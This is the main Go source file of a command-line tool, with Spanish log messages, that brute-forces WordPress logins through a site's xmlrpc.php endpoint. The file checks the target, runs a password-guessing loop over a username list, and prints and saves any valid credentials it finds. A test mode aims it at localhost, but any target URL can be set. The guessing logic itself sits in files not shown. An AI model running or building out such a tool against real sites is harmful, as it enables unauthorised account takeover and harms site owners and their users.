package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func main() {
	PrintBanner()

	cfg, err := ParseConfig()
	if err != nil {
		os.Exit(1)
	}

	if cfg.TestMode {
		logInfo("Ejecutando en MODO DE PRUEBA contra localhost:8080")
		cfg.Target = "http://localhost:8080"

		hasAdmin := false
		for _, u := range cfg.UsernameList {
			if u == "admin" {
				hasAdmin = true
				break
			}
		}
		if !hasAdmin {
			cfg.UsernameList = append([]string{"admin"}, cfg.UsernameList...)
		}
	}

	logInfo("Checando el target: %s/xmlrpc.php", cfg.Target)

	client := NewWPClient(cfg.Target, 30*time.Second)
	if err := client.HealthCheck(); err != nil {
		logError("Falló la verificación de conexion al objetivo: %v", err)
		logInfo("Asegúrate de que WordPress esté ejecutándose en %s", cfg.Target)
		os.Exit(1)
	}
	logSuccess("Objetivo accesible: %s/xmlrpc.php", cfg.Target)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigChan
		logWarn("Señal recibida: %v. deteniendo el script...", sig)
		cancel()
	}()

	bruteForcer := NewBruteForcer(cfg, client)

	startTime := time.Now()
	found, err := bruteForcer.Run(ctx)
	elapsed := time.Since(startTime)

	logProgressDone()

	if err != nil {
		logError("Brute force fallido: %v", err)
		os.Exit(1)
	}

	fmt.Fprintln(os.Stderr)
	if len(found) > 0 {
		logSuccess("Encontradas %d credencial(es) válida(s):", len(found))
		for _, f := range found {
			logSuccess("  %s : %s", f.Username, f.Password)
		}

		if cfg.OutputFile != "" {
			if err := WriteOutput(cfg.OutputFile, found); err != nil {
				logError("Error al escribir la salida: %v", err)
			} else {
				logSuccess("Credenciales guardadas en: %s", cfg.OutputFile)
			}
		}
	} else {
		logWarn("No se encontraron credenciales validas")
	}

	if cfg.TestMode {
		fmt.Fprintln(os.Stderr)
		if len(found) > 0 {
			logSuccess("PRUEBA APROBADA: Credenciales validas encontradas en %s", elapsed.Round(time.Millisecond))
		} else {
			logWarn("PRUEBA COMPLETADA: No se encontraron credenciales válidas en %s", elapsed.Round(time.Millisecond))
		}
	}

	os.Exit(0)
}
